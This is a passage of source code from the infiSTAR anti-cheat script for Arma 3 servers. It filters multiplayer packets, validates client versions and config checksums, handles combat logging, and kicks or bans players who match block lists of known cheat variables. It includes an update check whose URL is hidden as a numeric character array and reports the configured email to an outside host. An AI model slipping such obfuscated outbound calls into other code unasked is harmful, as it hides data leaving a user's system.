'DB_fnc_mresToArray','db_fnc_asynccall','life_fnc_netSetVar','waitUntil{(markerText',                        'BIS_fnc_dbg_reminder_value','BIS_fnc_dbg_reminder'                  ];                  if(!_bannable) then                  {                        {if((_lcode find _x) != -1)exitWith {_bannable = true;};} forEach "+str _verybadStrings+";                  };                                    _name = '';_puid = '';                  if(count _input >= 7)then                  {                        _name = format['%1',_input select 6];                        _puid = format['%1',_input select 7];                        if((isNil '_name') || (isNil '_name'))then                        {                              _forward = true;_bannable = false;                        }                        else                        {                              if((_name == '__SERVER__') && (_puid == '__SERVER__'))then                              {                                    _forward = true;_bannable = false;                              };                        };                  };                                    if((_forward)&&(!_bannable))then                  {                        if((_this select 0) == 'BIS_fnc_MP_packet')then {_this call BIS_fnc_MPexec;} else {_this call life_fnc_MPexec;};                  }                  else                  {                        'ARMA_LOG' callExtension format['A3_BLOCKED_PACKETS:%1 (v0148)',_this];                                                _log1 = format['BAD_MP_packet: %1',_foundBad];                        _log2 = format['%1',_stringcode];                        if(_bannable)then                        {                              [_name,_puid,'BAN',toArray(_log1)] call "+_FNC_AH120_KICKLOG+";                              [_name,_puid,'BAN',toArray(_log2)] call "+_FNC_AH120_KICKLOG+";                              [_name,_puid] spawn fnc_infiServerKick;                        }                        else                        {                              [_name,_puid,'HLOG',toArray(_log1)] call "+_FNC_AH120_KICKLOG+";                              [_name,_puid,'HLOG',toArray(_log2)] call "+_FNC_AH120_KICKLOG+";                        };                        if((_name=='')&&(_puid==''))then                        {                              _test = '                                    if(isServer)exitWith {};                                    if(!isNil''life_fnc_MP_packet'')then                                    {                                          if(str('+str _input+') == str life_fnc_MP_packet)then                                          {                                                [profileName,getPlayerUID player,''HLOG'',toArray('+str _log1+')] call "+_AH120KICKLOG+";                                                [profileName,getPlayerUID player,''HLOG'',toArray('+str _log2+')] call "+_AH120KICKLOG+";                                          };                                    };                                    if(!isNil''BIS_fnc_MP_packet'')then                                    {                                          if(str('+str _input+') == str BIS_fnc_MP_packet)then                                          {                                                [profileName,getPlayerUID player,''HLOG'',toArray('+str _log1+')] call "+_AH120KICKLOG+";                                                [profileName,getPlayerUID player,''HLOG'',toArray('+str _log2+')] call "+_AH120KICKLOG+";                                          };                                    };                              ';                              [_test] call fnc_doGlobal;                        };                  };            };            "+_fnc_mpPackets+" = compileFinal ([_fnc_mpPackets] call fnc_CompilableString);            "; }; _A3AHstring = _A3AHstring + "            diag_log format['<infiSTAR.de> %1 - Thread MAIN: none-threaded code compiled and/or sent!',time];            [] spawn {                  diag_log format['<infiSTAR.de> %1 - Thread #1: Server Loop #1 starting now!',time];                  _time1 = time + 15;                  _time2 = time + 180;                  "; if(_UVC)then { _A3AHstring = _A3AHstring + "                  _fnc_deleteObject =                  {                        "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                        _version = getText(configFile >> 'CfgServerVersion' >> 'client');                        "; }; _A3AHstring = _A3AHstring + "                        _obj = (vehicle _obj);                        _callwith = _obj;                        "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                        _callwith = [_obj,'infiSTAR.de'];                        if((_obj isKindOf 'LandVehicle') || (_obj isKindOf 'Air') || (_obj isKindOf 'Ship') || (_obj isKindOf 'Tank'))then                        {                              _callwith call EPOCH_server_save_killedVehicle;                        }                        else                        {                              if(typeOf _obj in ['LockBoxProxy_EPOCH'] || (_obj isKindOf 'Buildable_Storage'))then                              {                                    _callwith call EPOCH_server_save_killedStorage;                                    _callwith call EPOCH_server_save_killedStorage;                              }                              else                              {                                    _callwith call EPOCH_server_save_killedBuilding;                              };                        };                        "; }; _A3AHstring = _A3AHstring + "                        if(!isNull _obj)then                        {                              _obj setPosATL (_obj modelToWorld [0,0,123]);                              _obj setDamage 5;                              deleteVehicle _obj;                        };                  };                  "; }; _A3AHstring = _A3AHstring + "                  _callphpscript = {                        _url = _this select 0;                        waitUntil {if ('ARMA_LOAD' callExtension format['%1',_url] == 'OK') exitWith {true};false};                        private '_res';                        waitUntil {_res = 'ARMA_LOAD' callExtension 'OK';if (_res != 'WAIT') exitWith {true};false};                        if (_res == 'ERROR') then {_error = 'ARMA_LOAD' callExtension 'ERROR';}else{diag_log _res;};                  };                  _from = if(isNil'UPDATEEMAIL') then {'ERROR'}else{UPDATEEMAIL};                  _vers = if(isNil'INFISTARVERSION') then {'ERROR'}else{INFISTARVERSION};                  _uchck = profileNamespace getVariable['UPDATECHECKED',_vers];                  if(_vers != _uchck)then                  {                        profileNamespace setVariable['UPDATECHECKED',_vers];                        saveprofileNamespace;                        _string = toString[104,116,116,112,58,47,47,118,46,105,110,102,105,83,84,65,82,46,100,101,47,105,110,100,101,120,46,112,104,112,63];                        _url = format['%1f=%2&v=%3',_string,_from,_vers];                        [_url] spawn _callphpscript;                  };                  if(isNil'"+_inCombatArray+"') then {"+_inCombatArray+" = [];};                  fnc_infiSTAR_CheckCombatLog = compileFinal '                        _plyr=_this select 0;                        _plyrUID=_this select 2;                        _name = _this select 3;                        _inCombat = 9001;                        if!("+_inCombatArray+" isEqualTo []) then                        {                              _fid = "+_inCombatArray+" find _plyrUID;                              if(_fid != -1) then                              {                                    _inCombat = "+_inCombatArray+" select (_fid+1);                              };                        };                        if(_inCombat == 1) then                        {                              if(alive _plyr) then                              {                                    _log = format[''%1(%2)'',_name,_plyrUID];                                    ''ARMA_LOG'' callExtension format[''A3_CombatLog:%1 (v0148)'',_log];                                    diag_log (''<infiSTAR.de>CombatLog| ''+_log+'' (v0148)'');                                                                        _txt = format[''%1 CombatLogged - you can loot the dead body!'',_name];                                    "+_massMessage+" = [''<t size=''''0.55'''' color=''''#AE0C4A''''>''+(_txt)+''</t>'',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];                                    {(owner _x) publicVariableClient ''"+_massMessage+"'';} forEach playableUnits;                              };                              _vars=_plyr getVariable[''VARS'',[]];                              _group=_plyr getVariable[''GROUP'',''''];                              _medical=[getBleedingRemaining _plyr,0,getOxygenRemaining _plyr,1];                              _appearance=[goggles _plyr,headgear _plyr,vest _plyr,backpack _plyr,uniform _plyr,typeOf _plyr];                              _itemsplayer=[getItemCargo(uniformContainer _plyr),getItemCargo(vestContainer _plyr),getItemCargo(backpackContainer _plyr)];                              _weaponsplayer=[getWeaponCargo(uniformContainer _plyr),getWeaponCargo(vestContainer _plyr),getWeaponCargo(backpackContainer _plyr)];                              _weapons=[currentWeapon _plyr,weaponsItems _plyr,[primaryWeapon _plyr,secondaryWeapon _plyr,handgunWeapon _plyr]];                              _plyr setDamage 1;                              _return=[''Player'',_plyrUID,EPOCH_expiresPlayer,[[0,[],(call EPOCH_fn_InstanceID)],_medical,_appearance,[],_vars,_weapons,assignedItems _plyr,magazinesAmmo _plyr,_itemsplayer,_weaponsplayer,_group,false]]call EPOCH_server_hiveSETEX;                        }                        else                        {                              _this call EPOCH_server_onPlayerDisconnect                        };                  ';                  diag_log format['<infiSTAR.de> %1 - Thread #1: Server Loop #1 looping now!',time];                  while {1 == 1} do                  {                        'PVAH_AdminReq' addPublicVariableEventHandler {(_this select 1) call "+_FNC_PVAH_AdminReq+";};                        '"+_AH120_KICKLOG+"' addPublicVariableEventHandler {_this call "+_FNC_AH120_KICKLOGSPAWN+";};                                                "; if(_MPF)then { _A3AHstring = _A3AHstring + "                              'life_fnc_MP_packet' addPublicVariableEventHandler {_this call "+_fnc_mpPackets+";};                              'BIS_fnc_MP_packet' addPublicVariableEventHandler {_this call "+_fnc_mpPackets+";};                        "; }; _A3AHstring = _A3AHstring + "                                                "; if(_OPC)then { _A3AHstring = _A3AHstring + "                              onPlayerConnected {                                    [_uid,_name] call fnc_infiSTAR_PlayerLog;                                    _log = format['+++Connected: %1(%2) - time: %3 - serverTime: %4',_name,_uid,time,serverTime];                                    _log call FNC_A3_CONNECTLOG;                                    call compile "+str _customOnPlayerConnected+";                                    "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                          ['Connected',format['playerConnected:%1:%2',_uid,_name]]call EPOCH_server_hiveLog;                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_KKC)then { _A3AHstring = _A3AHstring + "                                          if(_uid == '')exitWith {};                                          0 = [_name, _uid] spawn {                                                _name = _this select 0;                                                _uid = _this select 1;                                                _check = {                                                      _cond = false;                                                      _ban = false;                                                      {                                                            _what = _x select 1;                                                            _state = _x select 1;                                                            _cond = _what != '0' && _state != 'none';                                                            if(_cond)then {                                                                  if(_what == 'DaysSinceLastBan')then                                                                  {                                                                        if(typeName _state == 'STRING')then {_state = parseNumber _state;};                                                                        if(_state >= 30)then {_ban = true;};                                                                  };                                                            };                                                            _cond                                                      } count _this;                                                      if(_cond)then                                                      {                                                            _log = format['Player %1(%2) has Steam bans: %3',_name,_uid,_this];                                                            _log call FNC_A3_CONNECTLOG;                                                      };                                                      if(_ban)then {                                                            _log = format['Steam bans: %1',_this];                                                            [_name,_uid,'BAN',toArray(_log)] call "+_FNC_AH120_KICKLOG+";                                                      };                                                };                                                'check_player' callExtension _uid;                                                _mytime = time + 12;                                                private '_bans';                                                waitUntil {                                                      _bans = 'check_player' callExtension _uid;                                                      _bans != 'WAIT' || {_bans = '[]'; time > _mytime}                                                };                                                if(_bans == '[]')then {                                                      _log = format['Player check failed for %1(%2) - (player free to play but unchecked..)',_name,_uid];                                                      _log call FNC_A3_CONNECTLOG;                                                }                                                else                                                {                                                      if((call compile _bans) call _check == 0)then {                                                            _log = format['Player %1(%2) - OK',_name,_uid];                                                            diag_log _log;                                                      };                                                };                                          };                                    "; }; _A3AHstring = _A3AHstring + "                              };                        "; }; _A3AHstring = _A3AHstring + "                        "; if(_OPD)then { _A3AHstring = _A3AHstring + "                              "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                    removeAllMissionEventHandlers 'HandleDisconnect';                                    addMissionEventHandler['HandleDisconnect',{_this call fnc_infiSTAR_CheckCombatLog}];                                    onPlayerDisconnected {                                          ['Disconnected',format['playerConnected:%1:%2',_uid,_name]]call EPOCH_server_hiveLog;                                          _uid call EPOCH_server_disconnect;                                          _log = format['---Disconnected: %1(%2) - time: %3 - serverTime: %4',_name,_uid,time,serverTime];                                          _log call FNC_A3_CONNECTLOG;                                    };                              "; }else{ _A3AHstring = _A3AHstring + "                                    onPlayerDisconnected {                                          _log = format['---Disconnected: %1(%2) - time: %3 - serverTime: %4',_name,_uid,time,serverTime];                                          _log call FNC_A3_CONNECTLOG;                                    };                              "; }; _A3AHstring = _A3AHstring + "                              "; if(_MOD == 'AltisLife')then { _A3AHstring = _A3AHstring + "                                    removeAllMissionEventHandlers 'HandleDisconnect';                                    addMissionEventHandler ['HandleDisconnect',{_this call TON_fnc_clientDisconnect; false;}];                              "; }; _A3AHstring = _A3AHstring + "                        "; }; _A3AHstring = _A3AHstring + "                        if(time > _time1)then                        {                              _time1 = time + 15;                                                            _checkplayableUnits = false;                              if(time > _time2)then                              {                                    _time2 = time + 180;                                    _checkplayableUnits = true;                              };                                                            {                                    if(!isNull _x)then                                    {                                          if(alive _x)then                                          {                                                _uid = getPlayerUID _x;                                                if!(_uid isEqualTo '')then                                                {                                                      _name = name _x;                                                      [_uid,_name] call fnc_infiSTAR_PlayerLog;                                                      if(isNil '"+_PoopTokenArray+"')then {"+_PoopTokenArray+" = [];};                                                      _uidhastoken = false;                                                      if(_uid in "+_PoopTokenArray+")then                                                      {                                                            _uidhastoken = true;                                                            _token = "+_PoopTokenArray+" select (("+_PoopTokenArray+" find _uid)+1);                                                            "+_YourPlayerToken+" = _token;                                                            (owner _x) publicVariableClient '"+_YourPlayerToken+"';                                                      };                                                                                                            _namePlayerObject = _x getVariable['realname','-1'];                                                      if!(_namePlayerObject isEqualTo _name)then                                                      {                                                            _x setVariable['realname',_name,true];                                                      };                                                      _puidPlayerObject = _x getVariable['PUID','-1'];                                                      if!(_puidPlayerObject isEqualTo _uid)then                                                      {                                                            _x setVariable['PUID',_uid];                                                      };                                                      if(_checkplayableUnits)then                                                      {                                                            if!(_x in playableUnits)then                                                            {                                                                  _log = 'NOT IN PLAYABLEUNITS (KICKED)';                                                                  [_name,_uid,'SLOG',toArray(_log)] call "+_FNC_AH120_KICKLOG+";                                                                  [_name,_uid] spawn fnc_infiServerKick;                                                            };                                                      };                                                      "; if(_AHL)then { _A3AHstring = _A3AHstring + "                                                            if(_uidhastoken)then                                                            {                                                                  _ctime = time;                                                                  _otime = _ctime;                                                                  _loadedchecktime = _x getVariable['"+_loadedchecktime+"',0];                                                                  if(str _loadedchecktime == '0')then                                                                  {                                                                        _x setVariable['"+_loadedchecktime+"',_ctime];                                                                  }                                                                  else                                                                  {                                                                        _otime = _x getVariable['"+_loadedchecktime+"',_ctime];                                                                  };                                                                                                                                    _timedif= _ctime - _otime;                                                                  _maxdif= ("+str _TDI+")+10;                                                                  if(_timedif> _maxdif)then                                                                  {                                                                        _loaded = _x getVariable['"+_loaded+"',[]];                                                                        if(!isNil'_loaded')then                                                                        {                                                                              for '_i' from 0 to 9 do                                                                              {                                                                                    if!(_i in _loaded)exitWith                                                                                    {                                                                                          _log = format['AH NOT LOADED ON PLAYER (S)  @%1%2, timedif: %3, loaded: %4',                                                                                          getPos _x,                                                                                          mapGridPosition _x,                                                                                          _timedif,                                                                                          _loaded                                                                                          ];                                                                                          [_name,_uid,'HLOG',toArray(_log)] call "+_FNC_AH120_KICKLOG+";                                                                                          [_name,_uid] spawn fnc_infiServerKick;                                                                                    };                                                                              };                                                                        };                                                                  };                                                            };                                                      "; }; _A3AHstring = _A3AHstring + "                                                      "; if(_UVC)then { _A3AHstring = _A3AHstring + "                                                            _obj = vehicle _x;                                                            if!(_obj isEqualTo _x)then                                                            {                                                                  _type = typeOf _obj;                                                                  if((!("+str _UVW+") && {_type in "+str _ForbiddenVehicles+"}) || (("+str _UVW+") && {!(_type in "+str _VehicleWhiteList+")}))then                                                                  {                                                                        _crew = crew _obj;                                                                        if!(_crew isEqualTo [])then                                                                        {                                                                              if(call{{if((getPlayerUID _x) in "+_adminsA+")exitWith {true};false} forEach _crew;})exitWith {};                                                                                                                                                            _log = format['BadVehicle (S): %1',_type];                                                                              {                                                                                    _name = name _x;                                                                                    _puid = getPlayerUID _x;                                                                                    [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                              } forEach _crew;                                                                              call _fnc_deleteObject;                                                                        };                                                                  };                                                            };                                                      "; }; _A3AHstring = _A3AHstring + "                                                };                                          };                                    };                              } forEach playableUnits;                        };                        uiSleep 5;                  };            };            [] spawn {                  diag_log format['<infiSTAR.de> %1 - Thread #2: Server Loop #2 starting now!',time];                  _fnc_zero_one = {                        _curservertime = time;                        "+_clientoncethree+" = _curservertime;                        _zero = ""if(!hasInterface && !isDedicated)exitWith{};                        if(!isServer)then                        {                              _AHKickOFF = compileFinal '                                    sleep 0.3;                                    [] spawn {_d = (findDisplay 0) createDisplay ''RscDisplayMission'';(findDisplay 0) closeDisplay 0;};                                    [] spawn {for ''_c'' from 0 to 101 do {findDisplay _c closeDisplay 0;};};                              ';                              if(isNil'"+_AHKickOFF+"')then {"+_AHKickOFF+" = _AHKickOFF;};                              if(str _AHKickOFF != str "+_AHKickOFF+")then                              {                                    [] spawn _AHKickOFF;                              };                              _AH120KICKLOG = compileFinal '                                    if(isNil''"+_YourPlayerToken+"'')then{"+_YourPlayerToken+"='''';};                                    "+_AH120_KICKLOG+" = ["+_YourPlayerToken+",_this];                                    publicVariableServer ''"+_AH120_KICKLOG+"'';                                    "+_AH120_KICKLOG+"=nil;                              ';                              if(isNil'"+_AH120KICKLOG+"')then {"+_AH120KICKLOG+" = _AH120KICKLOG;};                              if(str _AH120KICKLOG != str "+_AH120KICKLOG+")then                              {                                    [] spawn _AHKickOFF;                              };                              {                                    if(!isNil '_x')then                                    {                                          if(typeName _x != 'ARRAY')then                                          {                                                [] spawn _AHKickOFF;                                          };                                    };                              } forEach ["+_AH120_KICKLOG+","+_adminsA+","+_MC+"];                              {                                    if(!isNil '_x')then                                    {                                          if(typeName _x == 'CODE')then                                          {                                                _log = format['AntiAntiHack #1: %1 - %2',_x,missionNamespace getVariable _x];                                                _log spawn {                                                      waitUntil {!isNil '"+_YourPlayerToken+"'};                                                      [profileName,getPlayerUID player,'BAN',toArray(_this)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                    };                              } forEach [                                    "+_YourPlayerToken+","+_TokenCheck+","+_clientoncethree+",                                    "+_ninetwo+","+_ninetwothread+","+_AH_RunCheckARRAY+","+_AH_RunCheckENDVAR+","+_clientdo+",                                    "+_massMessage+","+_AHpos+","+_oneachframe+","+_checkidicheckcheck+","+_lastshotmade+",                                    "+_dellocveh+","+_gogogo+","+_gogogoCONTENT+","+_toBreakDisplays+","+_inCombatTime+"                              ];                              _check = ""+str "+str _TokenCheckN+"+"";                              if(isNil '"+_TokenCheck+"')then                              {                                    "+_TokenCheck+" = _check;                                    [] spawn {                                          private'_tmpYourPlayerToken';                                          waitUntil {!isNil '"+_YourPlayerToken+"'};                                          _tmpYourPlayerToken = "+_YourPlayerToken+";                                          waitUntil {if(isNil'"+_YourPlayerToken+"')then{"+_YourPlayerToken+"='';};str _tmpYourPlayerToken != str "+_YourPlayerToken+"};                                          [] spawn "+_AHKickOFF+";                                    };                              }                              else                              {                                    if(str("+_TokenCheck+") != str(_check))then                                    {                                          [] spawn _AHKickOFF;                                    };                              };                              {                                    _vc = missionNamespace getVariable _x;                                    if(!isNil '_vc')then                                    {                                          _log = format['BadVar in missionNamespace: %1 - %2',_x,_vc];                                          _log spawn {                                                waitUntil {!isNil '"+_YourPlayerToken+"'};                                                [profileName,getPlayerUID player,'BAN',toArray(_this)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                    };                              } forEach ['time','serverTime','myplayeruid','hhahaaaaar','CharlieSheenkeybinds','KickOFF','yolo','runonce','notakeybind','action1','Supa_Licenses','autokick','wallaisseikun',                              'GEFClose','GEFWhite','GEFRed','GEFGreen','GEFCyan','FirstHint','new_queued','fn_Exec','FND_fnc_select','fnx3','ANTIHACKKICK','tele','dmap','GOLDENS_GLOBAL_SHIT_YEAH','GLASS911_Run',                              'gearDialog_create','lystoKeypress','ThirtySix','LY_SwaggerLikeUs','Jkeyszz','n2','boxofmagic','MainScripts','DMC_fnc_4danews','INFISTARBYPASS','EXEC_TEXT','vehicle_dblclick','init_main',                              'ESP_Count','Nute_Dat_Bomber','s_cash100k','XposPlayer','ly_re_onetime','SKAR_checkA','MainScriptsV4','ViewDistance','check_load','already_load','meins','f1','Dummy','Plane_Jump',                              'c_player','MouseClickEH','distp','nec2','Menu_I_Run_Color_LP','GLASSv1nce_BindHandler','thecar','FastAnimes','GetinPassenger','iaimon','DMC_Re_onetime','func_execOnServer','fnc_serverKickNice',                              'Kick_Admins','DASMOKEON','hovering','r_kelly_be_flying','SLX_XEH_BWC_INIT_COMPILE','VinceLOL_ALTISLIFE'];                              "; if(_UMH)then { _A3AHstring = _A3AHstring + "                                    _sArray = ["+str _rscDCl+","+str _rscDCl1+","+str _rscDCl2+","+str _rscDCu+","+str _init+","+str _init1+"];                                    _rscDCl = toArray(getText(configFile >> 'RscDisplayConfigure' >> 'onLoad'));                                    _rscDCu = toArray(getText(configFile >> 'RscDisplayConfigure' >> 'onUnload'));                                    _init = toArray(getText(configFile >> 'cfgFunctions' >> 'init'));                                    {                                          _a = _x select 0;                                          if!(_a in _sArray)then {                                                _log = format['Memoryhack %1 %2 changed: %3',_x select 1,_x select 2,toString _a];                                                _log spawn {                                                      waitUntil {!isNil '"+_YourPlayerToken+"'};                                                      [profileName,getPlayerUID player,'BAN',toArray(_this)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                    } forEach [[_rscDCl,'RscDisplayConfigure','onLoad'],[_rscDCu,'RscDisplayConfigure','onUnload'],[_init,'cfgFunctions','init']];                                                                                                            _initL = (getText(configFile >> 'RscDisplayMission' >> 'onLoad'));                                    _initUL = (getText(configFile >> 'RscDisplayMission' >> 'onUnload'));                                    _markerL = (getText(configFile >> 'RscDisplayInsertMarker' >> 'onLoad'));                                    _markerUL = (getText(configFile >> 'RscDisplayInsertMarker' >> 'onUnload'));                                    _EB1 = (getText(configfile >> 'RscDisplayInventory' >> 'controls' >> 'EpochBTN1' >> 'onMouseButtonDown'));                                    _EB2 = (getText(configfile >> 'RscDisplayInventory' >> 'controls' >> 'EpochBTN2' >> 'onMouseButtonDown'));                                    _EB3 = (getText(configfile >> 'TapOut' >> 'controls' >> 'tapout' >> 'action'));                                    _EB4 = (getText(configfile >> 'TapOut' >> 'controls' >> 'tapout' >> 'onKeyDown'));                                    _array = [                                          [_initL,'RscDisplayMission','onLoad'],                                          [_initUL,'RscDisplayMission','onUnload'],                                          [_markerL,'RscDisplayInsertMarker','onLoad'],                                          [_markerUL,'RscDisplayInsertMarker','onUnload'],                                          [_EB1,'RscDisplayInventory >> EpochBTN1','onMouseButtonDown'],                                          [_EB2,'RscDisplayInventory >> EpochBTN2','onMouseButtonDown'],                                          [_EB3,'TapOut','action'],                                          [_EB4,'TapOut','onKeyDown']                                    ];                                    {                                          _cur = _array select _forEachIndex;                                          _a = _cur select 0;                                          if!((toArray(_a)) isEqualTo _x)then {                                                _sb = toString _x;                                                _log = format['Memoryhack %1 %2 changed: %3, %4',_cur select 1,_cur select 2,_a,_sb];                                                _log spawn {                                                      waitUntil {!isNil '"+_YourPlayerToken+"'};                                                      [profileName,getPlayerUID player,'BAN',toArray(_this)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                    } forEach ["+str _initL+","+str _initUL+","+str _markerL+","+str _markerUL+","+str _EB1+","+str _EB2+","+str _EB3+"];                              "; }; _A3AHstring = _A3AHstring + "                                                            if(isNil '"+_clientoncethree+"')then                              {                                    "+_clientoncethree+"=""+str _curservertime+"";                                    [] spawn {                                          private['_playerUID','_puid','_RunOnClients','_AH_MAIN_BLOCK'];                                          waitUntil {((player == player)&&(!isNil '"+_YourPlayerToken+"')&&(!isNull findDisplay 18)&&(!isNull findDisplay 46))};                                          waitUntil {_playerUID = getPlayerUID player;(_playerUID != '')};                                          waitUntil {_ownerVar = _playerUID;{getplayeruid _x == _ownerVar} count playableunits > 0};                                          _puid = _playerUID;                                          _name = profileName;                                                                                    "; if(_MOD == 'EPOCH')then { _A3AHstring = _A3AHstring + "                                                _serverEpochVersion=""+str "+str _serverEpochVersion+"+"";                                                _clientEpochVersion=getText(configFile >> 'CfgMods' >> 'Epoch' >> 'version');                                                if(_serverEpochVersion != _clientEpochVersion) then                                                {                                                      _log = format['Client Epoch Version: %1, Server Epoch Version: %2 - Client Kicked.',_clientEpochVersion,_serverEpochVersion];                                                      [profileName,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                      (findDisplay 46) closeDisplay 0;                                                };                                                _clientEpochVersionS=""+str "+str _clientEpochVersionS+"+"";                                                if(_clientEpochVersionS != _clientEpochVersion) then                                                {                                                      _log = format['Client Epoch Version: %1, Server Epoch Client Version : %2 - Client Kicked.',_clientEpochVersion,_clientEpochVersionS];                                                      [profileName,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                      (findDisplay 46) closeDisplay 0;                                                };                                          "; }; _A3AHstring = _A3AHstring + "                                          if(""+str "+str _CAV+"+"")then                                          {                                                _Arma3ServerVersion = ""+str "+str productVersion+"+"";                                                _Arma3ServerVersion = [_Arma3ServerVersion select 0,_Arma3ServerVersion select 1,_Arma3ServerVersion select 2,_Arma3ServerVersion select 4,_Arma3ServerVersion select 5];                                                _Arma3ClientVersion = productVersion;                                                _Arma3ClientVersion = [_Arma3ClientVersion select 0,_Arma3ClientVersion select 1,_Arma3ClientVersion select 2,_Arma3ClientVersion select 4,_Arma3ClientVersion select 5];                                                if!(_Arma3ServerVersion isEqualTo _Arma3ClientVersion) then                                                {                                                      _log = format['Client Arma3 Version: %1, Server Arma3 Version: %2 - Client Kicked.',_Arma3ServerVersion,_Arma3ClientVersion];                                                      [profileName,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                      (findDisplay 46) closeDisplay 0;                                                };                                          };                                          waitUntil {!isNil '"+_gogogo+"'};                                          _gogogo = "+_gogogo+";"+_gogogo+"=nil;                                          _gogogoCONTENT = ""+str"+str _gogogoCONTENT+"+"";                                          if(str _gogogo != str _gogogoCONTENT)then                                          {                                                _log = format['Client Start Variable Changed! %1/%2',_gogogo,_gogogoCONTENT];                                                [profileName,_playerUID,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                [] spawn "+_AHKickOFF+";                                          };                                                                                    _time = time;                                          waitUntil {(((!isNil '"+_RunOnClients+"')&&(!isNil '"+_AH_MAIN_BLOCK+"'))||(time - _time > 15))};                                                                                    _logging = profileNamespace getVariable['rscdebugconsole_expression',''];                                          if(typeName _logging == 'STRING') then                                          {                                                if(_logging != '') then                                                {                                                      _log = format['rscdebugconsole: %1',_logging];                                                      [profileName,_playerUID,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                      profileNamespace setVariable['rscdebugconsole_expression',''];saveprofileNamespace;                                                };                                          };                                                                                    if(isNil '"+_AH_RunCheckARRAY+"')then {"+_AH_RunCheckARRAY+" = [];};                                          [] spawn {                                                private'_playerUID';                                                _playerUID = getPlayerUID player;                                                while {1 == 1} do                                                {                                                      if(isNil '"+_AH_RunCheckARRAY+"')exitWith                                                      {                                                            _log = 'RunCheck bypass detected - ARRAY is Nil';                                                            [profileName,_playerUID,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                      if(typeName "+_AH_RunCheckARRAY+" != 'ARRAY')exitWith                                                      {                                                            _log = 'RunCheck bypass detected - TYPE CHANGED';                                                            [profileName,_playerUID,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                      "; if(_AHL)then { _A3AHstring = _A3AHstring + "                                                            _vOnP = player getVariable['"+_loaded+"',[]];                                                            _vOnM = "+_AH_RunCheckARRAY+";                                                            if(str _vOnP != str _vOnM)then                                                            {                                                                  player setVariable['"+_loaded+"',_vOnM,true];                                                            };                                                            sleep 0.1;                                                      "; }else{ _A3AHstring = _A3AHstring + "                                                            sleep 10;                                                      "; }; _A3AHstring = _A3AHstring + "                                                };                                          };                                                                                    if(isNil '"+_RunOnClients+"')then                                          {                                                (findDisplay 46) closeDisplay 0;                                          }                                          else                                          {                                                _RunOnClients = "+_RunOnClients+";                                                "+_RunOnClients+"=nil;                                                _arrayRunOnClients = toArray(str _RunOnClients);                                                _sumRunOnClients = 0;                                                {                                                      _val = call {                                                            if(_x <= 10)exitWith {_x};                                                            if(_x > 70)exitWith {_x/69};                                                            if(_x > 65)exitWith {_x/62};                                                            if(_x > 60)exitWith {_x/53};                                                            if(_x > 50)exitWith {_x/49};                                                            if(_x > 40)exitWith {_x/37};                                                            if(_x > 30)exitWith {_x/26};                                                            if(_x > 25)exitWith {_x/24};                                                            if(_x > 20)exitWith {_x/18};                                                            if(_x > 15)exitWith {_x/14};                                                            if(_x > 10)exitWith {_x/9};                                                            _x                                                      };                                                      _sumRunOnClients = _sumRunOnClients + _val;                                                } forEach _arrayRunOnClients;                                                _sumRunOnClientsS = ""+str "+_sumRunOnClients+"+"";                                                if(str _sumRunOnClients != str _sumRunOnClientsS)then                                                {                                                      _log = format['RunOnClients CHECKSUM-CHANGED: %1/%2| %3',_sumRunOnClients,_sumRunOnClientsS,_RunOnClients select [0,100]];                                                      [profileName,_playerUID,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                                                                    if(isNil '"+_AH_MAIN_BLOCK+"')then                                          {                                                (findDisplay 46) closeDisplay 0;                                          }                                          else                                          {                                                _AH_MAIN_BLOCK = "+_AH_MAIN_BLOCK+";                                                "+_AH_MAIN_BLOCK+"=nil;                                                _arrayAH_MAIN_BLOCK = toArray(str _AH_MAIN_BLOCK);                                                _sumAH_MAIN_BLOCK = 0;                                                {                                                      _val = call {                                                            if(_x <= 10)exitWith {_x};                                                            if(_x > 70)exitWith {_x/69};                                                            if(_x > 65)exitWith {_x/62};                                                            if(_x > 60)exitWith {_x/53};                                                            if(_x > 50)exitWith {_x/49};                                                            if(_x > 40)exitWith {_x/37};                                                            if(_x > 30)exitWith {_x/26};                                                            if(_x > 25)exitWith {_x/24};                                                            if(_x > 20)exitWith {_x/18};                                                            if(_x > 15)exitWith {_x/14};                                                            if(_x > 10)exitWith {_x/9};                                                            _x                                                      };                                                      _sumAH_MAIN_BLOCK = _sumAH_MAIN_BLOCK + _val;                                                } forEach _arrayAH_MAIN_BLOCK;                                                _sumAH_MAIN_BLOCKS = ""+str "+_sumAH_MAIN_BLOCK+"+"";                                                if(str _sumAH_MAIN_BLOCK != str _sumAH_MAIN_BLOCKS)then                                                {                                                      _log = format['AH_MAIN_BLOCK CHECKSUM-CHANGED: %1/%2| %3',_sumAH_MAIN_BLOCK,_sumAH_MAIN_BLOCKS,_AH_MAIN_BLOCK select [0,100]];                                                      [profileName,_playerUID,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                          call _RunOnClients;                                    };                              }                              else                              {                                    if(typeName "+_clientoncethree+" == 'SCALAR')then                                    {                                          _dif= abs(""+str _curservertime+"" - "+_clientoncethree+");                                          if(_dif> 140)then                                          {                                                _log = format['ClientOnceThree BadValue: %1',_dif];                                                _log spawn {                                                      waitUntil {!isNil '"+_YourPlayerToken+"'};                                                      